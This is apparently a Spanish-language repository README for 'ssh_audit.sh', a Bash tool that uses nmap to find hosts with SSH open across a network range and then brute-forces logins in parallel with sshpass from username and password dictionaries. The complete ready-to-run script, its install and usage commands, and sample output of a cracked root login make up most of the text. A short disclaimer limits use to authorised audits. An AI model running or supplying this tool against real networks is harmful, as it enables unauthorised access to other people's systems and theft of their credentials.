# Script de Automatización para Servicios SSH

## Descripción
Este script en Bash (.sh) ha sido desarrollado por **Kaleth Corcho** para automatizar la auditoría y explotación de vulnerabilidades en servicios SSH. Está diseñado para escanear redes, identificar hosts con puertos SSH abiertos (puerto 22 por defecto) y realizar pruebas de fuerza bruta de credenciales de manera eficiente. 

**Advertencia importante:** Este script es solo para fines educativos y de auditoría de seguridad en entornos autorizados. Su uso para actividades ilegales está estrictamente prohibido. Usa el código con precaución y asegúrate de tener permiso explícito para escanear o probar sistemas.

## Características Principales
- **Estructura modular:** Utiliza funciones como `test_credentials` y `scan_ssh_services` para facilitar el mantenimiento y la extensibilidad del código.
- **Gestión de archivos:** Crea un directorio de salida único por ejecución con timestamp (ej: `ssh_audit_20231015_143022`) para evitar sobrescribir datos previos. Los resultados se guardan en archivos como `valid_credentials.txt`, `scan.gnmap` y `ssh_hosts.txt`.
- **Interfaz mejorada:** Emplea colores (rojo para errores, verde para éxitos, amarillo para advertencias) y banners para una mejor experiencia de usuario.
- **Paralelismo:** Soporte para ejecución en hilos (configurable con `THREADS=5`) para acelerar las pruebas de credenciales sin sobrecargar el sistema.
- **Manejo de interrupciones:** Captura señales como Ctrl+C (SIGINT) para una salida limpia, evitando procesos huérfanos o archivos temporales.
- **Diccionarios externos:** Carga usuarios y contraseñas desde archivos `.txt` (ej: `users.txt` y `passwords.txt`). Si no existen, crea versiones por defecto para pruebas iniciales.
- **Extracción robusta de IPs:** Usa el formato grepeable de Nmap (`-oG`) para parsear resultados de manera estable, evitando fallos con formatos variables o nombres de host.

## Áreas de Mejora Implementadas (Puntos Críticos del Script Original)
En la versión original, se identificaron varios puntos débiles que se han optimizado en esta versión mejorada (v1.2):
- **Paralelismo:** La variable `THREADS` no se usaba, haciendo el script secuencial y lento. Ahora implementa procesos en segundo plano (`&` y `wait`) para pruebas paralelas limitadas por hilos.
- **Extracción de IPs:** El comando `awk '{print $NF}'` podía fallar con cambios de formato en Nmap o nombres de host. Se reemplazó por `-oG` y `grep "Host:" | awk '{print $2}'` para mayor robustez.
- **Manejo de interrupciones:** Sin `trap`, Ctrl+C dejaba procesos colgados. Ahora usa `trap` para salida limpia.
- **Diccionarios externos:** Las credenciales hardcodeadas limitaban la flexibilidad. Ahora lee de archivos `.txt`, con auto-creación si faltan.

## Requisitos y Dependencias
- **Sistema:** Linux/Unix con Bash (versión 4+ recomendada).
- **Herramientas requeridas:**
  - `nmap`: Para escanear puertos SSH.
  - `sshpass`: Para automatizar contraseñas en SSH.
  - `timeout`: Para limitar tiempo de conexiones (parte de GNU coreutils).

Instalación en Ubuntu/Debian:
```
sudo apt update
sudo apt install nmap sshpass
```

En otros sistemas, usa el gestor de paquetes correspondiente (ej: `yum` en CentOS, `brew` en macOS).

## Instalación
1. Clona o descarga el script: `ssh_audit.sh`.
2. Hazlo ejecutable: `chmod +x ssh_audit.sh`.
3. Crea diccionarios opcionales:
   - `users.txt` (ejemplo):
     ```
     root
     admin
     user
     ```
   - `passwords.txt` (ejemplo):
     ```
     admin
     123456
     password
     root
     ```
   Si no los creas, el script generará versiones básicas automáticamente.

## Uso
Ejecuta el script con una red objetivo como argumento (CIDR notation, ej: `192.168.1.0/24`). Si no se proporciona, usa el default.

```
./ssh_audit.sh [red_objetivo]
```

Ejemplo:
```
./ssh_audit.sh 10.0.0.0/24
```

### Flujo de Ejecución
1. **Verificación de dependencias:** Comprueba si `nmap` y `sshpass` están instalados.
2. **Creación de diccionarios:** Si faltan `users.txt` o `passwords.txt`, crea ejemplos por defecto.
3. **Escaneo SSH:** Usa Nmap para encontrar hosts con puerto 22 abierto en la red especificada. Resultados en `scan.gnmap` y `ssh_hosts.txt`.
4. **Fuerza bruta:** Para cada host, prueba combinaciones de usuarios/contraseñas en paralelo (limitado por `THREADS`). Éxitos se guardan en `valid_credentials.txt`.
5. **Salida:** Muestra resultados finales y crea un directorio con timestamp para todos los archivos.

Opciones configurables en el script (edita el encabezado):
- `THREADS=5`: Número máximo de procesos paralelos.
- `TIMEOUT=5`: Tiempo máximo por intento de conexión (segundos).

### Ejemplo de Salida
```
[*] Escaneando red: 192.168.1.0/24...
[*] Se encontraron 3 hosts con SSH abierto.

[*] Atacando: 192.168.1.10
[+] ¡ÉXITO! 192.168.1.10 -> root:123456

[*] Atacando: 192.168.1.15
...

--- Proceso completado. Resultados en ssh_audit_20231015_143022 ---
192.168.1.10:22 | root:123456
```

## Versión del Script
Esta es la **versión 1.2** (mejorada con diccionarios externos y optimizaciones de hilos). Copia y pega en un archivo `.sh`.

```bash
#!/bin/bash
# Automatización SSH Pro - v1.2
# Desarrollado por Kaleth Corcho
# Mejoras: Carga de diccionarios externos y optimización de hilos.

# Colores
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

# Configuración
THREADS=5
TIMEOUT=5
OUTPUT_DIR="ssh_audit_$(date +%Y%m%d_%H%M%S)"
# Nombres de los archivos de diccionario
USER_FILE="users.txt"
PASS_FILE="passwords.txt"

mkdir -p "$OUTPUT_DIR"
trap "echo -e '${RED}\n[!] Saliendo...${NC}'; exit 1" SIGINT SIGTERM

# Función para verificar o crear diccionarios de ejemplo
check_dictionaries() {
    if [[ ! -f "$USER_FILE" || ! -f "$PASS_FILE" ]]; then
        echo -e "${YELLOW}[!] Archivos de diccionario no encontrados.${NC}"
        echo -e "[*] Creando diccionarios por defecto: $USER_FILE y $PASS_FILE"
        echo -e "root\nadmin\nuser" > "$USER_FILE"
        echo -e "admin\n123456\npassword\nroot" > "$PASS_FILE"
    fi
}

test_credentials() {
    local host=$1 user=$2 pass=$3 port=$4
    
    if timeout $TIMEOUT sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=$TIMEOUT -o BatchMode=yes -o PubkeyAuthentication=no \
        -p "$port" "$user@$host" "id" &>/dev/null; then
        
        echo -e "${GREEN}[+] ¡ÉXITO! $host -> $user:$pass${NC}"
        echo "$host:$port | $user:$pass" >> "$OUTPUT_DIR/valid_credentials.txt"
        return 0
    fi
    return 1
}

brute_force_ssh() {
    local host=$1 port=$2
    local job_count=0

    # Leemos los archivos línea por línea
    while IFS= read -r user; do
        while IFS= read -r pass; do
            
            # Control de hilos (Paralelismo)
            ((job_count++))
            test_credentials "$host" "$user" "$pass" "$port" &
            
            # Si alcanzamos el límite de hilos, esperamos a que terminen
            if (( job_count % THREADS == 0 )); then
                wait
            fi

        done < "$PASS_FILE"
    done < "$USER_FILE"
    wait # Esperar los últimos procesos
}

scan_ssh_services() {
    local network=$1
    echo -e "[*] Escaneando red: $network..."
    nmap -p 22 --open -Pn "$network" -oG "$OUTPUT_DIR/scan.gnmap" > /dev/null
    grep "Host:" "$OUTPUT_DIR/scan.gnmap" | awk '{print $2}' > "$OUTPUT_DIR/ssh_hosts.txt"
    
    local count=$(wc -l < "$OUTPUT_DIR/ssh_hosts.txt")
    echo -e "[*] Se encontraron ${YELLOW}$count${NC} hosts con SSH abierto."
}

main() {
    # Validar dependencias
    for cmd in nmap sshpass; do
        command -v $cmd &>/dev/null || { echo -e "${RED}[-] Falta $cmd${NC}"; exit 1; }
    done

    check_dictionaries

    # Definir red (puedes pasarla como argumento: ./script.sh 10.0.0.0/24)
    local target_net=${1:-"192.168.1.0/24"}
    
    scan_ssh_services "$target_net"

    if [[ -s "$OUTPUT_DIR/ssh_hosts.txt" ]]; then
        while read -r host; do
            echo -e "\n[*] Atacando: ${YELLOW}$host${NC}"
            brute_force_ssh "$host" 22
        done < "$OUTPUT_DIR/ssh_hosts.txt"
    else
        echo -e "${RED}[-] No hay hosts para procesar.${NC}"
    fi

    echo -e "\n${GREEN}--- Proceso completado. Resultados en $OUTPUT_DIR ---${NC}"
}

main "$@"
```

## Cambios Clave en Versiones Mejoradas
- **De v1.0 a v1.1:** Añadido paralelismo con `&` y `wait`, `BatchMode=yes` para evitar interacciones, `trap` para señales, y extracción de IPs con `-oG`.
- **De v1.1 a v1.2:** Doble bucle `while` para leer diccionarios externos línea por línea (`IFS= read -r` para manejar espacios/caracteres especiales), `PubkeyAuthentication=no` para pruebas más rápidas, y auto-creación de diccionarios por defecto.

## Notas Adicionales
- **Rendimiento:** Ajusta `THREADS` según tu hardware; valores altos pueden saturar la red o ser detectados como ataque.
- **Seguridad:** No uses en redes públicas. Para pruebas reales, integra con herramientas como Hydra o Medusa para más opciones.
- **Contribuciones:** Si encuentras bugs o mejoras, ¡abre un issue en el repositorio!

Desarrollado con ❤️ por **Kaleth Corcho**. ¡Úsalo responsablemente!
